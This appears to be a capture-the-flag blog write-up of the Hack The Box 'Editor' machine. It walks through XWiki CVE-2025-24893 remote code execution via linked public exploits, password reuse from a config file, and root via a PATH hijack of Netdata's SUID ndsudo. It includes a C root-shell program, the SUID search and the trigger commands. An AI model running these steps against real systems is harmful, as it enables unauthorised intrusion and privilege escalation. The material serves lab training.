---
title: Editor - HTB
date: 2025-08-07 4:00:00 +0200
categories: [Hack The Box, Linux0]
tags: [ Linux]
toc: true
comments: true
image: ./assets/img/attachments/editor.png
imageNameKey: editor
---
Hey, this machine is an easy Linux machine from HTB, lets see how we will root it
## Port Enumeration
First, we should know what we have and what we are dealing with
```bash
sudo nmap -sS -p- -A 10.10.11.80 

Nmap scan report for 10.10.11.80
Host is up (0.36s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editor.htb/
8080/tcp open  http    Jetty 10.0.20
|_http-server-header: Jetty(10.0.20)
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|   Server Type: Jetty(10.0.20)
|_  WebDAV type: Unknown
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
| http-methods: 
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
|_http-open-proxy: Proxy might be redirecting requests
| http-title: XWiki - Main - Intro
|_Requested resource was http://10.10.11.80:8080/xwiki/bin/view/Main/
| http-robots.txt: 50 disallowed entries (15 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
|_/xwiki/bin/undelete/
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

lets check web page on port 80
![w](/assets/img/attachments/editor-1.png)
When i click on `Docs` the page directs me to a subdomain `wiki.editor.htb` which runs on port 8080  (you must add this one to /etc/hosts)
![w](/assets/img/attachments/editor-2.png)
And we have an exploit for this version
lets test them
[The link of the exploit I used](https://github.com/a1baradi/Exploit/blob/main/CVE-2025-24893.py)
XWiki Platform suffers from a critical vulnerability where any guest user can execute arbitrary code remotely through the SolrSearch endpoint. This can lead to a full server compromise, including the ability to execute commands on the underlying system.
Targeted path: `/bin/get/Main/SolrSearch`
But note that this subdomain uses /xwiki/bin
```bash
python3 exploit.py

[?] Enter the target URL (without http/https): wiki.editor.htb/xwiki
```
![w](/assets/img/attachments/editor-3.png)
And it retrieved the content of /etc/passwd
## Initial Access
Now, will modify the exploit to get a reverse shell
It didn't get a shell but successfully executed internal commands, s i switched to this [exploit](https://github.com/gunzf0x/CVE-2025-24893)
![w](/assets/img/attachments/editor-4.png)
![w](/assets/img/attachments/editor-5.png)
Spawn a TTY shell from an interpreter
```bash
python3 -c 'import pty; pty.spawn("/bin/sh")'
```
Then after some enumeration i found this file `/etc/xwiki/hibernate.cfg.xml`
![w](/assets/img/attachments/editor-6.png)
will test this password for oliver user
The `su` command didnâ€™t work, but the password was valid for SSH login.
![w](/assets/img/attachments/editor-7.png)
## Root 
Find command to list SUID files owned by root.
```bash
find / -user root -perm -4000 -type f 2>/dev/null
```
```bash
ls -l /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
file /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo

-rwsr-x--- 1 root netdata 200576 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, with debug_info, not stripped

oliver@editor:~$ id
uid=1000(oliver) gid=1000(oliver) groups=1000(oliver),999(netdata)

```
cool we can execute this tool
![w](/assets/img/attachments/editor-8.png)
But couldn't see how i can escalate from here.
Lets checks running services
```bash
ss -tulnp
```
![w](/assets/img/attachments/editor-9.png)
I forwarded port 19999 to see what does it host
```bash
ssh oliver@10.10.11.80 -L 19999:127.0.0.1:19999
```
![w](/assets/img/attachments/editor-10.png)
It's running netdata service (the same provided ndsudo), and from the redline we can get this service version 1.45.2
![w](/assets/img/attachments/editor-11.png)
[Exploit](https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93)
1- create an executable 
```c
#include <unistd.h>
#include <stdlib.h>

int main() {
    setresuid(0, 0, 0);
    setresgid(0, 0, 0);
    char *args[] = {"/bin/bash", "-i", NULL};
    execve("/bin/bash", args, NULL);
    return 0;
}

```
Then compile it 
```
gcc exploit.c -o nvme
```
We need to send it to victim machine
```
python -m http.server
```
at victim machine we use curl or wget
Then make it executable
```bash
chmod +x nvme

export PATH=/home/oliver:$PATH
```
Trigger the vulnerable tool ndsudo
```bash
opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```
![w](/assets/img/attachments/editor-12.png)
And ROOTED!
